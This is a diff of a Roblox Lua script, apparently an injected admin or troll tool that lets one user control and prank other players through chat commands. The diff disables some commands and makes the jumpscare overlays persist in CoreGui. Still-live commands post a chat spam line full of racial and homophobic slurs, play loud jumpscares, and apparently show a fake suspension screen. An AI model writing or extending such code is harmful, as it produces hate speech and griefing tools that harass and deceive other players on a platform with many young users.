@@ -49,13 +49,12 @@ local adminCmd = {
 }
 
 local commandsList = {
-    ".rejoin", ".fast", ".normal", ".slow", ".unfloat", ".float",
-    ".void", ".jump", ".trip", ".sit", ".freeze", ".unfreeze",
-    ".kick", ".kill", ".bring", ".js", ".js2", ".invert",
-    ".uninvert", ".spin", ".unspin",
+    ".fast", ".normal", ".slow", ".unfloat", ".float",
+    ".void", ".js", ".js2", ".invert",
+    ".uninvert",
     ".privland",
-    ".crash", ".smartwalktome", ".walktome", ".control", ".uncontrol", ".fling",
-    ".follow", ".unfollow", ".spam", ".warn", ".suspend", ".knock", ".scare"
+    ".smartwalktome", ".walktome", ".control", ".uncontrol",
+    ".spam", ".warn", ".suspend", ".knock", ".scare"
 }
 
 local frozenPlayers = {}
@@ -201,8 +200,10 @@ local function setupAdminCommands(admin)
             -- Admin Commands
             if command == ".ownercmds" then
                 createCommandGui(player)
+            --[[ Removed Commands
             elseif command == ".rejoin" then
                 game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
+            ]]
             elseif command == ".fast" then
                 player.Character.Humanoid.WalkSpeed = 50
             elseif command == ".normal" then
@@ -234,12 +235,10 @@ teleport()
                 player.Character.HumanoidRootPart.Anchored = true
             elseif command == ".void" then
                 player.Character.HumanoidRootPart.CFrame = CFrame.new(1000000, 1000000, 1000000)
+            --[[ Removed Commands
             elseif command == ".jump" then
                 player.Character.Humanoid.Jump = true
-
-
-
-elseif command == ".trip" then
+            elseif command == ".trip" then
                local humanoid = player.Character.Humanoid
 local hrp = player.Character.HumanoidRootPart
 -- Create banana MeshPart
@@ -307,7 +306,7 @@ banana:Destroy()
 slipSound:Destroy()
             elseif command == ".sit" then
                 player.Character.Humanoid.Sit = true
-        
+            ]]
 
 
 elseif command == ".smartwalktome" then
@@ -542,6 +541,7 @@ for _, seat in game.Workspace:GetDescendants() do
 end
 
 game.Workspace.DescendantAdded:Connect(enableSeat)
+            --[[ Removed Commands
             elseif command == ".fling" then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(250,250,250)
                 game.Players.LocalPlayer.Character.Humanoid.Sit=true
@@ -562,6 +562,7 @@ game.Workspace.DescendantAdded:Connect(enableSeat)
             follow(true,admin.Character.HumanoidRootPart.Position)
             elseif command == ".unfollow" then
             follow(false,admin.Character.HumanoidRootPart.Position) -- Korrektur: unfollow sollte false übergeben
+            ]]
             elseif command == ".spam" then
             Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
             Chat("nigga fuck nigga fuck nigga bitch nigger faggot fuck you sex hot faggot i hate niggers alot")
@@ -751,7 +752,7 @@ tweenIn:Play()
 tweenIn.Completed:Wait() -- Wait for tween to complete
 RobloxVoiceChatPromptGui:Destroy() -- Destroy the GUI
 
-elseif command == ".suspend" then
+            elseif command == ".suspend" then
 -- Gui to Lua
 -- Version: 3.2
 
@@ -1070,12 +1071,18 @@ local function KIAWSKW_fake_script() -- ConfirmButton.LocalScript
 end
 coroutine.wrap(KIAWSKW_fake_script)()
 
-            elseif command == ".bring" then
+            -- Removed Commands
+            --[[elseif command == ".bring" then
                 player.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
+            ]]
             elseif command == ".js" then
-                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+                local jumpscareGui = Instance.new("ScreenGui", game:GetService("CoreGui")) -- Parent to CoreGui
+                jumpscareGui.DisplayOrder = 10 -- Ensure it's on top
+                jumpscareGui.ResetOnSpawn = false -- Prevent reset on respawn
                 local img = Instance.new("ImageLabel", jumpscareGui)
-                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=10798732430"
+                img.Size = UDim2.new(1, 0, 1, 0) -- Full screen size
+                img.Position = UDim2.new(0, 0, 0, 0) -- Cover entire screen
+                img.Image = "http://www.roblox.com/asset/?id=10798732430"
                 local sound = Instance.new("Sound", game:GetService("SoundService"))
                 sound.SoundId, sound.Volume = "rbxassetid://161964303", 10
                 sound:Play()
@@ -1083,9 +1090,13 @@ coroutine.wrap(KIAWSKW_fake_script)()
                 jumpscareGui:Destroy()
                 sound:Destroy()
             elseif command == ".js2" then
-                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+                local jumpscareGui = Instance.new("ScreenGui",  game:GetService("CoreGui")) -- Parent to CoreGui
+                jumpscareGui.DisplayOrder = 10 -- Ensure it's on top
+                jumpscareGui.ResetOnSpawn = false -- Prevent reset on respawn
                 local img = Instance.new("ImageLabel", jumpscareGui)
-                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=75431648694596"
+                img.Size = UDim2.new(1, 0, 1, 0) -- Full screen size
+                img.Position = UDim2.new(0, 0, 0, 0) -- Cover entire screen
+                img.Image = "http://www.roblox.com/asset/?id=75431648694596"
                 local sound = Instance.new("Sound", game:GetService("SoundService"))
                 sound.SoundId, sound.Volume = "rbxassetid://7236490488", 100
                 sound:Play()
@@ -1110,7 +1121,8 @@ coroutine.wrap(KIAWSKW_fake_script)()
                 if controlInversionActive[player.UserId] then
                     controlInversionActive[player.UserId] = nil
                 end
-            elseif command == ".spin" then
+            -- Removed Commands
+            --[[elseif command == ".spin" then
                 if not spinActive[player.UserId] then
                     spinActive[player.UserId] = true
                     local char = player.Character
@@ -1127,6 +1139,7 @@ coroutine.wrap(KIAWSKW_fake_script)()
                 if spinActive[player.UserId] then
                     spinActive[player.UserId] = nil
                 end
+            ]]
             elseif command == ".disablejump" then
                 if not jumpDisabled[player.UserId] then
                     jumpDisabled[player.UserId] = true
@@ -1146,7 +1159,8 @@ coroutine.wrap(KIAWSKW_fake_script)()
                     end
                     jumpDisabled[player.UserId] = nil
                 end
-            elseif command == ".scare" then
+            -- Removed Commands
+            --[[elseif command == ".scare" then
                 local sound = Instance.new("Sound", player.Character)
                 sound.SoundId = "rbxassetid://157636218"
                 sound.Volume = 100
@@ -1160,6 +1174,7 @@ coroutine.wrap(KIAWSKW_fake_script)()
                 sound:Play()
                 wait(15) -- Wait for the sound to finish
                 sound:Destroy()
+            ]]
             elseif command == ".bighead" then
                 local head = player.Character:FindFirstChild("Head")
                 if head then
@@ -1182,6 +1197,166 @@ coroutine.wrap(KIAWSKW_fake_script)()
                 mesh.Parent = hat
                 hat.Parent = player.Character
             end
+        end
+         -- Admin Target Commands
+        if targetPlayer then
+            -- Removed Commands
+            --[[if command == ".bring" then
+                executeCommand(admin, targetPlayer, ".bring")
+            elseif command == ".kill" then
+                executeCommand(admin, targetPlayer, ".kill")
+            elseif command == ".jump" then
+                targetPlayer.Character.Humanoid.Jump = true
+            elseif command == ".sit" then
+                targetPlayer.Character.Humanoid.Sit = true
+            ]]-- Removed Commands
+            --[[elseif command == ".spin" then
+                if not spinActive[targetPlayer.UserId] then
+                    spinActive[targetPlayer.UserId] = true
+                    local char = targetPlayer.Character
+                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        local initialRotation = char.HumanoidRootPart.CFrame
+                        for i = 1, 12 do
+                            wait(0.1)
+                            char.HumanoidRootPart.CFrame = initialRotation * CFrame.Angles(0, math.rad(30 * i), 0)
+                        end
+                    end
+                end
+            elseif command == ".unspin" then
+                if spinActive[targetPlayer.UserId] then
+                    spinActive[targetPlayer.UserId] = nil
+                end
+            ]]-- Removed Commands
+            --[[elseif command == ".speed" then
+                local speedValue = tonumber(msg:match("%.speed%s+[^%s]+%s+(%d+)"))
+                if speedValue then
+                    targetPlayer.Character.Humanoid.WalkSpeed = speedValue
+                else
+                    Chat("Invalid speed value. Please use a number.")
+                end
+            ]]-- Removed Commands
+            --[[elseif command == ".kick" then
+                local reason = msg:match("%.kick%s+[^%s]+%s+(.*)")
+                targetPlayer:Kick(reason or "Kicked by admin")
+            ]]-- Removed Commands
+            --[[elseif command == ".freeze" then
+                targetPlayer.Character.HumanoidRootPart.Anchored = true
+                frozenPlayers[targetPlayer.UserId] = true
+            elseif command == ".unfreeze" then
+                if frozenPlayers[targetPlayer.UserId] then
+                    targetPlayer.Character.HumanoidRootPart.Anchored = false
+                    frozenPlayers[targetPlayer.UserId] = nil
+                end
+            ]]-- Removed Commands
+            --[[elseif command == ".follow" then
+                follow(true, targetPlayer.Character.HumanoidRootPart.Position)
+            elseif command == ".unfollow" then
+                follow(false, targetPlayer.Character.HumanoidRootPart.Position)
+            ]]-- Removed Commands
+            --[[elseif command == ".fling" then
+                targetPlayer.Character.HumanoidRootPart.Velocity=Vector3.new(250,250,250)
+                targetPlayer.Character.Humanoid.Sit=true
+            ]]-- Removed Commands
+            --[[elseif command == ".orbit" then
+                local parts = msg:split(" ")
+                local distance = tonumber(parts[3])
+                local speed = tonumber(parts[4])
+                if distance and speed then
+                    local targetHRP = targetPlayer.Character.HumanoidRootPart
+                    local localHRP = player.Character.HumanoidRootPart
+                    local orbitRadius = distance
+                    local orbitSpeed = speed
+                    local angle = 0
+                    local RunService = game:GetService("RunService")
+                    getgenv().orbiting = true
+
+                    local stepConnection = RunService.RenderStepped:Connect(function(deltaTime)
+                        if not getgenv().orbiting then
+                            stepConnection:Disconnect()
+                            return
+                        end
+                        angle = angle + orbitSpeed * deltaTime
+                        local orbitPosition = targetHRP.Position + Vector3.new(orbitRadius * math.cos(angle), 0, orbitRadius * math.sin(angle))
+                        localHRP.CFrame = CFrame.lookAt(orbitPosition, targetHRP.Position) * CFrame.Angles(0, math.rad(90), 0)
+                    end)
+                else
+                    Chat("Usage: .orbit [target] [distance] [speed]")
+                end
+            elseif command == ".unorbit" then
+                getgenv().orbiting = false
+            ]]-- Removed Commands
+            --[[elseif command == ".trip" then
+                local humanoid = targetPlayer.Character.Humanoid
+local hrp = targetPlayer.Character.HumanoidRootPart
+-- Create banana MeshPart
+local banana = Instance.new("MeshPart")
+banana.MeshId = "rbxassetid://7076530645"
+banana.TextureID = "rbxassetid://7076530688"
+banana.Size = Vector3.new(0.7, 1, 0.8) -- Made banana bigger
+banana.Anchored = true
+banana.CanCollide = false
+banana.Parent = workspace
+-- Create slip sound
+local slipSound = Instance.new("Sound")
+slipSound.SoundId = "rbxassetid://8317474936"
+slipSound.Volume = 1
+slipSound.Parent = hrp
+-- Use raycast to find floor position
+local rayOrigin = hrp.Position + Vector3.new(0, 0, -2)
+local rayDirection = Vector3.new(0, -10, 0)
+local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
+if raycastResult then
+    -- Place banana sideways with a 90-degree rotation on X axis
+    banana.CFrame = CFrame.new(raycastResult.Position)
+        * CFrame.Angles(math.rad(90), math.rad(math.random(0, 360)), 0)
+else
+    banana.CFrame = hrp.CFrame * CFrame.new(0, -2.5, -2)
+end
+   -- Create and configure the forward movement tween
+    local tweenService = game:GetService("TweenService")
+    local forwardTweenInfo = TweenInfo.new(
+        0.3, -- Duration
+        Enum.EasingStyle.Linear,
+        Enum.EasingDirection.Out
+    )
+
+    -- Move character forward
+    local forwardGoal = {CFrame = hrp.CFrame * CFrame.new(0, 0, -3)} -- Move 3 studs forward
+    local forwardTween = tweenService:Create(hrp, forwardTweenInfo, forwardGoal)
+    forwardTween:Play()
+
+    -- Wait for forward movement to complete
+    task.wait(0.3)
+
+    -- Create and configure the arc falling tween
+    local fallTweenInfo = TweenInfo.new(
+        0.6, -- Longer duration for arc motion
+        Enum.EasingStyle.Quad,
+        Enum.EasingDirection.In -- Changed to In for better arc effect
+    )
+
+    -- Tween the character's position and rotation in an arc
+    local fallGoal = {
+        CFrame = hrp.CFrame
+        * CFrame.new(0, -0.5, -4) -- Move forward and down
+        * CFrame.Angles(math.rad(90), 0, 0) -- Rotate forward
+    }
+    local fallTween = tweenService:Create(hrp, fallTweenInfo, fallGoal)
+    fallTween:Play()
+humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
+task.wait(2)
+humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+task.wait(0.5)
+humanoid:ChangeState(Enum.HumanoidStateType.None)
+task.wait(1)
+banana:Destroy()
+slipSound:Destroy()
+            ]]-- Removed Commands
+            --[[elseif command == ".re" then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, targetPlayer)
+            end
+            ]]
         end
     end)
 end
